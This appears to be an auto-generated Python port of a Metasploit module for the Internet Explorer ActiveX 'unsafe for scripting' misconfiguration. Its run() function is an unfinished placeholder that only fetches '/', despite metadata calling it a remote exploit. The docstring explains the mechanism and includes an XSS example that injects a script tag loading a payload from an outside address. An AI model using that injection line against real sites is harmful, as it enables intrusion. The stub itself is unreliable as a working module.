#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Microsoft Internet Explorer Unsafe Scripting Misconfiguration

This exploit takes advantage of the "Initialize and script ActiveX controls not
marked safe for scripting" setting within Internet Explorer.  When this option is set,
IE allows access to the WScript.Shell ActiveX control, which allows javascript to
interact with the file system and run commands.  This security flaw is not uncommon
in corporate environments for the 'Intranet' or 'Trusted Site' zones.

When set via domain policy, the most common registry entry to modify is HKLM\
Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201,
which if set to '0' forces ActiveX controls not marked safe for scripting to be
enabled for the Intranet zone.

This module creates a javascript/html hybrid that will render correctly either
via a direct GET http://msf-server/ or as a javascript include, such as in:
http://intranet-server/xss.asp?id="><script%20src=http://10.10.10.10/ie_unsafe_script.js>
</script>.

IE Tabs, WScript and subsequent Powershell prompts all run as x86 even when run from
an x64 iexplore.exe.

By default, this module will not attempt to fire against IEs that come with Protected
Mode enabled by default, because it can trigger a security prompt. However, if you are
feeling brave, you can choose to ignore this restriction by setting the ALLOWPROMPT
datastore option to true.
"""

import logging
import sys
import os

# Add lib path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../lib'))

from metasploit import module
from msf.http_client import HTTPClient, CheckCode

metadata = {
    'name': 'Microsoft Internet Explorer Unsafe Scripting Misconfiguration',
    'description': '''
        This exploit takes advantage of the "Initialize and script ActiveX controls not
        marked safe for scripting" setting within Internet Explorer.  When this option is set,
        IE allows access to the WScript.Shell ActiveX control, which allows javascript to
        interact with the file system and run commands.  This security flaw is not uncommon
        in corporate environments for the 'Intranet' or 'Trusted Site' zones.
        
        When set via domain policy, the most common registry entry to modify is HKLM\
        Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201,
        which if set to '0' forces ActiveX controls not marked safe for scripting to be
        enabled for the Intranet zone.
        
        This module creates a javascript/html hybrid that will render correctly either
        via a direct GET http://msf-server/ or as a javascript include, such as in:
        http://intranet-server/xss.asp?id="><script%20src=http://10.10.10.10/ie_unsafe_script.js>
        </script>.
        
        IE Tabs, WScript and subsequent Powershell prompts all run as x86 even when run from
        an x64 iexplore.exe.
        
        By default, this module will not attempt to fire against IEs that come with Protected
        Mode enabled by default, because it can trigger a security prompt. However, if you are
        feeling brave, you can choose to ignore this restriction by setting the ALLOWPROMPT
        datastore option to true.
    ''',
    'authors': [
        'natron',
        'Ben Campbell',
    ],
    'date': '2010-09-20',
    'license': 'MSF_LICENSE',
    'type': 'remote_exploit',  # TODO: Adjust type
    'targets': [
        {'name': 'Windows x86/x64'},  # TODO: Add platform/arch
    ],
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True},
        'rport': {'type': 'port', 'description': 'Target port', 'required': True, 'default': 80},
        # TODO: Add module-specific options
    },
    'notes': {
        'stability': ['CRASH_SAFE'],  # TODO: Adjust
        'reliability': ['REPEATABLE_SESSION'],  # TODO: Adjust
        'side_effects': ['IOC_IN_LOGS']  # TODO: Adjust
    }
}


def run(args):
    '''Module entry point.'''
    module.LogHandler.setup(msg_prefix=f"{args['rhost']}:{args['rport']} - ")
    
    rhost = args['rhost']
    rport = args['rport']
    
    logging.info('Starting module execution...')
    
    # TODO: Implement module logic
    # 1. Create HTTP client or TCP socket
    # 2. Check if target is vulnerable
    # 3. Exploit the vulnerability
    # 4. Handle success/failure
    
    try:
        client = HTTPClient(rhost=rhost, rport=rport)
        
        # Your exploit code here
        response = client.get('/')
        if response:
            logging.info(f'Response status: {response.status_code}')
        
        client.close()
        
    except Exception as e:
        logging.error(f'Exploitation failed: {e}')
        return
    
    logging.info('Module execution complete')


if __name__ == '__main__':
    module.run(metadata, run)
